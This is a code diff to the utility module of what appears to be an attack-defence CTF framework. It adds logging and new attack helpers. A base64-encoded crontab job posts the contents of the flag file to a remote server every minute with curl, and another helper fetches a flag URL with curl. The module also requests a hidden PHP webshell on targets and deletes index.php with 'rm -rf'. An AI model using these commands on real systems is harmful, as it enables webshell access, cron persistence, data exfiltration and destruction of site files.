@@ -10,6 +10,7 @@ from urllib import quote
 import readline
 import utils.log
 from random import randint
+import time
 
 Log = utils.log.Log() 
 user_agents = open('data/ua.data').readlines()
@@ -18,35 +19,51 @@ def rot13(text):
     rot13trans = maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm')
     return text.translate(rot13trans)
 
+def write_sys_log(msg):
+    sys_time = time.strftime('%Y-%m-%d %H:%M:%S',(time.localtime(time.time())))
+    open(sys_log,'a').write(sys_time + "  " + msg+'\n')
+
 def dump_error(e,target="",load_script=""):
     if not target and not load_script:
         return Log.error(str(e))
-    Log.error("[error] fail to attack: " + target + " with error: " + str(e) \
-    + " with the script: " + load_script)
+    msg = "[error] fail to attack: " + target + " with error: " + str(e) \
+    + " with the script: " + load_script
+    Log.error(msg)
+    write_sys_log(msg)
+    
 
 def dump_warning(e,target="",load_script=""):
     if not target and not load_script:
         return Log.warning(str(e))
-    Log.warning("[warning] fail to attack: " + target + " with error: " + str(e) \
-    + " with the script: " + load_script)
+    msg = "[warning] fail to attack: " + target + " with error: " + str(e) \
+    + " with the script: " + load_script
+    Log.warning(msg)
+    write_sys_log(msg)
 
 def dump_success(info,target="",load_script=""):
     if not target and not load_script:
         return Log.success(str(info))
-    Log.success("[success] success to " + info + " from " + target + " with the script:"\
-    + load_script)
+    msg = "[success] success to " + info + " from " + target + " with the script:"\
+    + load_script
+    Log.success(msg)
+    write_sys_log(msg)
 
 def dump_context(info,target="",load_script=""):
     if not target and not load_script:
         return Log.context(str(info))
-    Log.context("[context] success to " + info + " from " + target + " with the script:"\
-    + load_script)
+    msg = "[context] success to " + info + " from " + target + " with the script:"\
+    + load_script
+    Log.context(msg)
+    # avoid too much output
+    #write_sys_log(msg)
     
 def dump_info(info,target="",load_script=""):
     if not target and not load_script:
         return Log.info(str(info))
-    Log.info("[info] success to " + info + " from " + target + " with the script:"\
-    + load_script)
+    msg = "[info] success to " + info + " from " + target + " with the script:"\
+    + load_script
+    Log.info(msg)
+    write_sys_log(msg)
 
 def debug_print(msg):
     if debug:
@@ -59,7 +76,7 @@ def res_filter(res):
         res = res[index_1:index_2]
     else:
         dump_warning("can not find the cmd_split in your output")
-	return ""
+	return "\nerror happen\n"
     return res
 
 def random_ua():
@@ -102,7 +119,9 @@ def check_shell(target,target_port,cmd):
 def visit_shell(target,target_port,cmd):
     shell_name = "." + hashlib.md5(shell_salt + target).hexdigest() + ".php"
     shell_arg = hashlib.md5(shell_salt_2 + target).hexdigest()
-    res = requests.get("http://" + target + ":" + str(target_port) + shell_path + "/"  + shell_name,timeout=2)
+    if headers.has_key('Content-Length'):
+	del(headers['Content-Length'])
+    res = requests.get("http://" + target + ":" + str(target_port) + shell_path + "/"  + shell_name,timeout=2,headers=headers)
     if res.status_code==200:
 	res.close()
 	return True
@@ -148,6 +167,9 @@ def get_shell(target,target_port,cmd):
 
 def get_flag(target,target_port,cmd):
     return "/bin/cat " + flag_path
+
+def get_flag_2(target,target_port,cmd):
+    return "/usr/bin/curl " + get_flag_url
 
 def rm_file_index(target,target_port,cmd):
     return "/bin/rm " + " -rf /var/www/html/index.php"
@@ -195,7 +217,15 @@ def crontab_flag_ip(target,target_port,cmd):
     debug_print(cmd)
     return cmd
 
-def crontab_rm(target,target_port,cmd):
+def crontab_flag_submit(target,target_port,cmd):
+    cmd = '/usr/bin/curl "http://%s:%s/%s" -d "token=%s&flag=$(/bin/cat %s)"' %(flag_server,flag_port,flag_url,flag_token,flag_path)
+    crontab_cmd = "* * * * * %s\n"%cmd
+    encode_crontab_cmd = base64.b64encode(crontab_cmd)
+    cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat >> " + crontab_path + "/tmp.conf" + " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
+    debug_print(cmd)
+    return cmd
+
+def crontab_clean(target,target_port,cmd):
     cmd = "/bin/rm " + crontab_path  + "/tmp.conf;/usr/bin/crontab -r"
     debug_print(cmd)
     return cmd
